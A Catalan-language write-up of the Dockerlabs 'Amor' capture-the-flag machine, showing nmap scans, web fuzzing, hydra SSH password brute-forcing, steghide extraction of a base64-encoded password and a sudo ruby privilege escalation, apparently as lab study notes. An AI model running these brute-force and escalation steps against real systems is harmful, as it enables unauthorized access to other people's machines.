# Amor

Plataforma: Dockerlabs
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 5 de diciembre de 2024 21:10

## Reconeixement

### NMAP

```bash
sudo nmap -p- -sS -sCV --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports
```

![image.png](<imagenes/image 11.png>)

```bash
sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted
cat targeted -l ruby
```

![image.png](<imagenes/image 12.png>)

Web :

![image.png](<imagenes/image 13.png>)

Possibles usuaris :

Carlota
Juan

### Provem possibles usuaris SSH

### Fuzzing WEB

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py
```

![image.png](<imagenes/image 14.png>)

Fuff per trobar directoris :

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "[http://172.17.0.2/FUZZ](http://172.17.0.2/FUZZ)" -recursion -recursion-depth 2 -c -ic -v
```

### Explotacio

Provem hydra amb els usuarios trobats:

Juan : no troba pass

Carlota: b******l

provem conexio ssh

Entrem com a carlota i trobem fitxer:

![image.png](<imagenes/image 15.png>)

Descarreguem fitxer amb :

```bash
ssh [carlota@172.17.0.2](mailto:carlota@172.17.0.2) 'cat /home/carlota/Desktop/fotos/vacaciones/imagen.jpg' > /home/fil/Desktop/docker/imagen.jpg
```

Mirem contingut amb Exiftool, pero no trobem res

![image.png](<imagenes/image 16.png>)

Trobem un altre usuari:

oscar


Provem hydra

```bash
hydra -l oscar -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -vV
```

No trobem pass

Probem a extreure info amb :

```bash
sudo steghide extract -sf imagen.jpg
```

Trobem fitxer secret.txt

![image.png](<imagenes/image 17.png>)

ZXNsYWNhc2FkZXBpbnlwb24=

Decodifiquem cadena:
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo

ZXNsYWNhc2FkZXBpbnlwb24= es************pon

Probem aquest password amb l'altre usuari

Oscar
es************pon

Entrem per ssh

```bash
ssh [oscar@172.17.0.2](mailto:oscar@172.17.0.2)
Pass: es************pon
```

Busquem fitxers

![image.png](<imagenes/image 18.png>)

Al escriptori hi ha un txt:

![image.png](<imagenes/image 19.png>)

### Escalada

Busquem permisos amb sudo

```bash
Sudo -l
```

![image.png](<imagenes/image 20.png>)

Podem explotar: ruby

Busquem GTOBINS:

![image.png](<imagenes/image 21.png>)

Executem :

![image.png](<imagenes/image 22.png>)

![image.png](<imagenes/image 23.png>)